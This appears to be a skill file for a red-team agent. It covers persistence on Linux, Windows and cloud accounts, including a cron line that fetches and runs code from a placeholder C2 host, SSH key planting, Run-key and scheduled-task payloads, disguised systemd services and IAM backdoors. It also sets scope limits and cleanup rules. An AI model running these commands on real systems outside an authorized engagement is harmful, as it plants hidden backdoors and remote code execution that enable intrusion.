---
name: persistence-overview
description: Establishing durable re-access to a compromised host or cloud account, for engagements that explicitly authorize it (red-team emulation, not a standard pentest). Use only when the engagement scope explicitly covers persistence/detection-testing. Do not use on a standard vulnerability-assessment or pentest engagement — proving initial access is normally sufficient; see shared/governance-rules.
phases: [persistence, post-exploitation]
tags: [persistence, cron, registry, iam]
mitre: [T1053, T1547, T1136, T1098]
requires_tools: []
---

Persistence is scope-gated harder than most other post-exploitation categories: a standard
vulnerability assessment or pentest proves access and stops — it does not plant standing
backdoors. This skill applies only when the engagement is explicitly a red-team/adversary-
emulation exercise (testing detection/response, not just finding the hole) and says so. Check
`shared/governance-rules` before using anything below; there's no code-enforced gate on the
`platform_shell` path, so this boundary is entirely on the operator.

## Linux

```
(crontab -l 2>/dev/null; echo "*/10 * * * * curl -s <C2>/beacon | sh") | crontab -   # cron
echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys                                     # SSH key
```
A `systemd` unit surviving as a disguised/renamed legitimate-looking service (`systemd-network-
helper.service`) is quieter than cron on a host with any monitoring — persistence value is
directly proportional to how unremarkable it looks in `systemctl list-units`.

## Windows

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "<payload>"
schtasks /create /tn "Updater" /tr "<payload>" /sc onlogon /ru SYSTEM
```
WMI event subscriptions (`__EventFilter`/`__EventConsumer`) survive reboots and don't appear in
the Run key or Task Scheduler UI — higher stealth, more setup.

## Cloud

- **AWS** — a backdoor IAM user with `AdministratorAccess`, or an added trust-policy statement on
  an existing role granting your own AWS account `sts:AssumeRole`, survives password rotation on
  the original compromised identity entirely.
- **Azure** — an added credential/certificate on an existing App Registration/Service Principal.
- **GCP** — an added key on an existing service account, or an IAM binding granting your identity
  a role directly.

Cloud persistence is often higher-impact to report than host persistence: it survives host
rebuild/reimaging entirely, and is exactly the class of finding "we redeployed everything, we're
clean" assumptions miss.

## Do not

- Plant persistence on any engagement that isn't explicitly scoped for it — this is the single
  highest-consequence mistake in this category; when in doubt, don't.
- Leave persistence in place at engagement end — clean up everything planted (cron entries,
  registry keys, IAM backdoors) and record exactly what was added, so the client can verify
  removal independently rather than trusting your word alone.
- Use a persistence mechanism indistinguishable from a real attacker's without flagging it clearly
  in evidence — the client's IR team needs to be able to tell your artifact from a genuine
  compromise during and after the engagement.
